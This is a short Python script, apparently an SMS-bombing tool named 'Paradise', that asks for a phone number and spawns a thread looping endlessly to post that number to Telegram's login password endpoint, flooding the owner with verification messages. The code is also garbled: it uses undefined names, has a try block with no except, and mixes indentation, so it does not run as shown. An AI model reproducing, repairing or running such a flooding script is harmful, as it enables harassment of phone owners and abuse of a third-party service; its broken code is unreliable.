#-= It's just illusion =-#

import requests
from threading import Thread
import random
from termcolor import colored

print(colored( '''
█▀▀█ █▀▀█ █▀▀█ █▀▀█ █▀▀▄ ░▀░ █▀▀ █▀▀
█░░█ █▄▄█ █▄▄▀ █▄▄█ █░░█ ▀█▀ ▀▀█ █▀▀
█▀▀▀ ▀░░▀ ▀░▀▀ ▀░░▀ ▀▀▀░ ▀▀▀ ▀▀▀ ▀▀▀
		  create by K1ng$oul
''','magenta'))


phone = input(colored('Enter your phone number>>: ','cyan'))
countT = input(colored('Enter threading>>: ','blue'))


iteration = 0
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

def _sms(phone):
    global x, y
    user = fake_useragent.UserAgent().random
    headers1 = {'user_agent': user}
    print(Fore.YELLOW)

    effect(message22)

def infinity():
	while True:
	
		
	 try:
            x += 1
            a = requests.post("https://my.telegram.org/auth/send_password",
            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от telegram отправлено!')
			
countT = Thread(target=infinity)
countT.start()
